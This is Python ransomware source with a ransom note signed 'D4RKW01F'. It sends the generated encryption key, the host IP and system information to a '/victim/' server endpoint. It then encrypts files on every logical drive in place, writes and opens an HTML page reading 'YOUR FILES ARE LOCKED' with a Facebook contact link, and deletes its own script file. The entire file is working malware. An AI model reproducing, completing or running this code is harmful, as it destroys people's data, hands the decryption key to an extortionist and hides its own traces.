import json
import os
import webbrowser   
from cryptography.fernet import Fernet
from win32api import GetLogicalDriveStrings
from threading import Thread
import requests
import socket
import platform
from os import remove
from sys import argv



KEY = Fernet.generate_key()
API_URL = "http://127.0.0.1:8000/victim/"




data = {
    "ip": socket.gethostbyname(socket.gethostname()),
    "key": KEY,
    "sys_information": str(platform.uname())
}

try:
    res = requests.post(API_URL, data=data)
    os.makedirs("R")
    with open("R/data.json", "w") as file_data:
        file_data.write(res.text)
except Exception:
    os.makedirs("R")
    
    with open("R/data.json", "w") as file_data:
        data = {
            "key": KEY.decode()
        }
        file_data.write(json.dumps(data))

fernet = Fernet(KEY)

def encrypt(file):
    try: 
        with open(file, "rb") as myFile:
            myFileData = myFile.read()
        
        encryptedMyFileData = fernet.encrypt(myFileData)

        with open(file, "wb") as myFile:
            myFile.write(encryptedMyFileData)
        # print(file, ", encrypted")
    except Exception as e:
        return


drives = GetLogicalDriveStrings().split("\x00")
drives.pop()
def run():
    for drive in drives:
     if(drive == "C:\\"):
        continue
    for root, folders, files in os.walk(drive):
        for file in files:
            encrypt(os.path.join(root, file))

    html_template = """
       
<html>

<head>
	<title>Hacked By D4RKW01F</title>
	<meta name="Description" content="Deface By D4RKW01F">
	<link href="https://fonts.googleapis.com/css?family=Kumar+One+Outline" rel="stylesheet" type="text/css">
	<link href="https://fonts.googleapis.com/css?family=Arvo|Electrolize|Iceberg" rel="stylesheet">
	<link rel="shortcut icon" href="../i.pinimg.com/originals/f5/7f/da/f57fda652b5aa0d8980e31b0faa83364.jpg" "="" type="
		image/png">
	<meta property="og:image" content="https://wallpaperaccess.com/full/203476.jpg" "=""> 
  </head>
  <body bgcolor=" #00000">
	<table width=100% height=0%>
		<td align="center">
			<img src="https://pa1.narvii.com/6355/ea22198b18a34ca7d5b543644a2b2dd9a6600a21_hq.gif" width="250PX"><br>
			<font face="Kumar One Outline" size="5" color="#02BC9C">[</font>
			<font face="iceberg" size="6" color="#ffffff">YOUR FILES ARE LOCKED <font face="Kumar One Outline" size="5"
					color="#02BC9C">]</font>
			</font><br><br>
			<font face="iceberg" size="5" color="#ffffff"> Contact me if you want to unlock your file </font><br><br><br><br>
			<font face="Kumar One Outline" size="4" color="#02BC9C">
				<font face="iceberg" size="5" color="#ffffff">
					 
							 
								<br><br><a style="text-align:right;"
									href="https://www.facebook.com/profile.php?id=100070999757421"> <img
										src="https://cdn4.iconfinder.com/data/icons/social-media-icons-the-circle-set/48/facebook_circle-512.png"
										<alt="Facebook Me" height="30" width="30"> </a>
	</table>
	<script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
	</body>

</html>
    """
    
    with open("msg.html", "w") as msg:
        msg.write(html_template)

    webbrowser.open("msg.html")
    

Thread(target=run).start()
remove(argv[0])
    